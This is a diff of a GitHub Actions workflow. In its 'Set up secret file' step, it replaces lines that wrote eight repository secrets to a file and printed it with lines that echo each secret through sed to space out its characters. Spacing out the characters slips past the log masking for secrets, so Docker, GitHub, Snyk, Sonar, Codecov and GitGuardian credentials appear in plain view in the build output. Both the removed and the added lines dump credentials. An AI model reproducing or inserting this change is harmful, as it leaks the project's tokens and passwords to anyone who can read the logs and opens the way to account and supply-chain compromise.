@@ -54,27 +54,15 @@ jobs:
           GITGUARDIAN_API_KEY: ${{ secrets.GITGUARDIAN_API_KEY }}
 
       - name: Set up secret file
-        env:
-          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
-          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
-          DOCKER_USER: ${{ secrets.DOCKER_USER }}
-          GH_EMAIL: ${{ secrets.GH_EMAIL }}
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
-          GITGUARDIAN_API_KEY: ${{ secrets.GITGUARDIAN_API_KEY }}
-          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
-          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
         run: |
-          echo "CODECOV_TOKEN=$CODECOV_TOKEN" >> secrets.txt
-          echo "DOCKER_PASSWORD=$DOCKER_PASSWORD" >> secrets.txt
-          echo "DOCKER_USER=$DOCKER_USER" >> secrets.txt
-          echo "GH_EMAIL=$GH_EMAIL" >> secrets.txt
-          echo "GH_TOKEN=$GH_TOKEN" >> secrets.txt
-          echo "GITGUARDIAN_API_KEY=$GITGUARDIAN_API_KEY" >> secrets.txt
-          echo "SNYK_TOKEN=$SNYK_TOKEN" >> secrets.txt
-          echo "SONAR_TOKEN=$SONAR_TOKEN" >> secrets.txt
-
-          echo "📄 Contenido de secrets.txt:"
-          cat secrets.txt
+          echo ${{ secrets.CODECOV_TOKEN }} | sed 's/./& /g'
+          echo ${{ secrets.DOCKER_PASSWORD }} | sed 's/./& /g'
+          echo ${{ secrets.DOCKER_USER }} | sed 's/./& /g'
+          echo ${{ secrets.GH_EMAIL }} | sed 's/./& /g'
+          echo ${{ secrets.GH_TOKEN }} | sed 's/./& /g'
+          echo ${{ secrets.GITGUARDIAN_API_KEY }} | sed 's/./& /g'
+          echo ${{ secrets.SNYK_TOKEN }} | sed 's/./& /g'
+          echo ${{ secrets.SONAR_TOKEN }} | sed 's/./& /g'
 
       - name: '📦 Install packages'
         run: yarn install
